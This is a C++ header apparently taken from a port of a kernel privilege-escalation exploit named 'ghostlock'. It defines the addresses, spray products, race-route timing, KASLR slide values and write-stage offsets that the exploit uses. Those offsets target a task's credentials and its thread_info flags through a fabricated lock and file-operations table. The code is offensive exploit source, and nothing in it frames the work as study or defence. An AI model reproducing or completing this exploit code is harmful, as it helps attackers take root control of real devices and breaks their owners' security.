#pragma once
/** @file jni/route_common.hpp
 *  What the two fake-lock routes share: three addresses in, a step and an errno out.
 *
 *  From bddfea4:src/core/fops.c. Both routes open with the same guard on the same three
 *  file-scope addresses, and both report progress the same way, through two file-scope
 *  integers:
 *
 *    do_tcp_fake_lock_route      (fops.c:129)  guard -> route_last_step = 40, then 41 on pair failure
 *    do_pselect_fake_lock_route  (fops.c:495)  guard -> route_last_step = 30
 *
 *  The three addresses and those two integers are here instead of at file scope, so the
 *  caller owns them and two routes can run without agreeing through globals.
 *
 *  The choice of which route runs used to be tcp_route_selected() in util.c:53, which read
 *  the environment variable GHOSTLOCK_TCP_ROUTE. That variable is not on the list this tree
 *  allows the execution layer to read, so the answer is a parameter now -- RouteChoice,
 *  already declared in race_threads.hpp -- and this file carries the values it needs.
 */
#include <cstddef>
#include <cstdint>

#include "jni/route_result.hpp"

namespace ghostlock::jni {
    /** The three addresses both routes guard on. Any of them null is refused, not guessed. */
    struct RouteAddrs final {
        /** The prepared kernel page base (the original page_base). */
        std::uintptr_t page_base = 0U;
        /** The fabricated lock the walk must find (fake_lock). */
        std::uintptr_t fake_lock = 0U;
        /** The fabricated file-operations table (fake_fops). */
        std::uintptr_t fake_fops = 0U;
    };

    /** What the spray produced; both routes and the write path read from here. */
    struct SprayProducts final {
        std::uintptr_t page_base = 0U;
        std::uintptr_t fake_lock = 0U;
        std::uintptr_t fake_fops = 0U;
        /** The first waiter word the pselect route reports; the tcp route does not use it. */
        std::uintptr_t fake_w0 = 0U;
        /** The fabricated task both routes aim the walk at. */
        std::uintptr_t fake_task = 0U;
    };

    /** The pselect route's own knobs, from the constants it used to read. */
    struct PselectTuning final {
        /** PSELECT_CFI_ROUTE_ATTEMPTS: how many attempts the compact route makes. */
        std::uint32_t cfi_route_attempts = 0U;
        /** The compact branch's timeout, in seconds and microseconds. */
        std::uint32_t compact_timeout_sec = 0U;
        std::uint32_t compact_timeout_usec = 0U;
        /** PSELECT_ROUTE_NFDS itself, without any slack. Two call sites add their own:
         *  the route adds 16 for its F_DUPFD, and open_selected_fds adds 32 for its own.
         *  Storing a pre-added value here made the route add 16 twice. */
        std::uint32_t pselect_route_nfds = 0U;
        /** The slack open_selected_fds used for its own F_DUPFD (fops.c:395), which is 32
         *  and not the 16 above; the two are separate on purpose. */
        std::uint32_t open_slack_32 = 0U;
        /** FAKE_WAITER_PRIO: the high half of the compact table wake_prio word, which the
         *  original built as (FAKE_WAITER_PRIO << 32) | 3. */
        std::uint32_t waiter_prio = 0U;
        /**
         *  PSELECT_TIMEOUT_SEC and PSELECT_TIMEOUT_USEC: the non-compact select timeout.
         *
         *  The value is two fields because the original spelled it as two macros, one of them
         *  behind an #ifdef. Its own comment at the call site (fops.c:596) says
         *  "non-compact stays on select with its 200ms timeout" -- that sentence is the only
         *  place the number was ever written down, so it is kept here next to the fields it
         *  describes. A caller filling these two should be filling in 200ms.
         */
        std::uint32_t select_timeout_sec = 0U;
        std::uint32_t select_timeout_usec = 0U;
        /** The RMGP wait-out loop: 2000 iterations of usleep(1000) before closing the fds. */
        std::uint32_t consumer_drain_iterations = 0U;
        std::uint32_t consumer_drain_usec = 0U;
        /** The per-attempt delay table, from fops.c:311-314; attempt indexes it modulo its
         *  own length. The C file reached it after consulting the environment variable
         *  PSELECT_DELAY_USEC, which the execution layer is not allowed to read -- a forced
         *  value, if the caller wants one, arrives as delay_override_usec instead. */
        std::uint32_t delay_table[8] = {50000U, 30000U, 70000U, 10000U,
                                        100000U, 150000U, 20000U, 120000U};
        /** The length of delay_table, so the index never uses a bare literal. */
        static constexpr std::size_t kDelayTableSize = 8U;
        /** A forced delay in microseconds; zero means use the table. */
        std::uint32_t delay_override_usec = 0U;
    };

    /**
     *  The two switches the write path set through file scope, kept separate.
     *
     *  The original had two independent ints, not one enum, and the difference matters:
     *  util.c:352-368 branched on pselect_custom_write (1 for W1, 2 for W2), while
     *  pselect_child_node decided whether initialized bytes were preserved -- main.c:376 set
     *  it from leaf, and main.c:1290 forced it on for W2. util.c:695 tests both together.
     *  Merging them into one tri-state would lose that.
     */
    struct WriteModeState final {
        /** pselect_custom_write: 0 cleared, 1 W1, 2 W2. Set by the mode landing. */
        std::int32_t pselect_custom_write = 0;
        /** pselect_child_node: preserve initialized bytes when set. Set from leaf. */
        std::int32_t pselect_child_node = 0;
    };

    /** The offsets and slide values the spray and the fdsets read. */
    struct SprayOffsets final {
        /** CRED_COPY_OFF and its tcp twin, used to place fake_fops. */
        std::uintptr_t cred_copy_off = 0U;
        std::uintptr_t tcp_cred_copy_off = 0U;
        /** The page-internal offset the W1 branch targeted (0x100). */
        std::uintptr_t w1_page_offset = 0U;
        /** The three slide values: waiter task, root task group, and pi top task. */
        std::uintptr_t slide_init_task = 0U;
        std::uintptr_t slide_root_task_group = 0U;
        /** The three addresses util.c:364-368 computed: fake_left is zeroed, fake_parent
         *  sits eight below pselect_custom_target, and pselect_custom_target is the target
         *  the write is aimed at. Kept separate from the delta below so the parameter face
         *  matches the original one for one. */
        std::uintptr_t fake_left = 0U;
        std::uintptr_t fake_parent = 0U;
        std::uintptr_t pselect_custom_target = 0U;
        /**
         *  The three offsets the write stages used, from main.c:1272 and :1305-1311.
         *
         *  TASK_CRED_OFF is where W2 aims inside the child task; TASK_THREAD_INFO_FLAGS_OFF is
         *  the thread_info.flags W3 clears; and the comm probe offset is the eight the pselect
         *  fallback needs to tell [target] from [target + 8] -- the tcp route stamps the target
         *  exactly and needs no probe.
         */
        std::uintptr_t task_cred_off = 0U;
        std::uintptr_t task_thread_info_flags_off = 0U;
        std::uintptr_t comm_probe_delta = 0U;
        /** The bound under which fake_parent sits: pselect_custom_target, minus eight. */
        std::uintptr_t fake_parent_delta = 8U;
    };

    /** The step numbers the original reported, kept as names rather than bare literals. */
    enum class RouteStep : std::int32_t {
        PselectGuard = 30,
        PselectDupFailed = 31,
        /** The consumer was neither called nor successful this attempt. */
        PselectAttemptNotWon = 33,
        /** The consumer is still inflight; the route leaks its fds on purpose (see below). */
        PselectConsumerStuck = 34,
        PselectRetryPrepareFailed = 35,
        TcpGuard = 40,
        TcpPairFailed = 41,
    };
}  // namespace ghostlock::jni
